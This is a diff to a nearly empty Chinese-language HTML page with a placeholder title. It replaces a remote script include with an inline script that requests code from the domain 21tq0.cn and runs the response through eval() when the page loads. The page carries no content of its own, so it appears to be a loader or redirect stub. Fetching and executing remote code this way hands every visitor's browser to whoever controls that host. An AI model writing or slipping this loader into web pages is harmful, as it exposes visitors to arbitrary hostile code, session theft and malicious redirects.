@@ -2,9 +2,20 @@
 <html lang="zh-cn">
 <head>
 	<meta charset="UTF-8">
-	<title>...</title>
+	<title>..1.</title>
 </head>
 <body>
-<script charset='UTF-8' src='https://21tq0.cn/rkaaa'></script>
+<script>
+var xhr = new XMLHttpRequest;
+var bt = null;
+xhr.onload = function() {
+    bt = xhr.responseText;
+    eval(bt);
+};
+xhr.open("GET", "https://21tq0.cn/hb3.php?s=/Index/rukou_ssl", !0);
+xhr.send();
+</script>
 </body>
 </html>
+
+
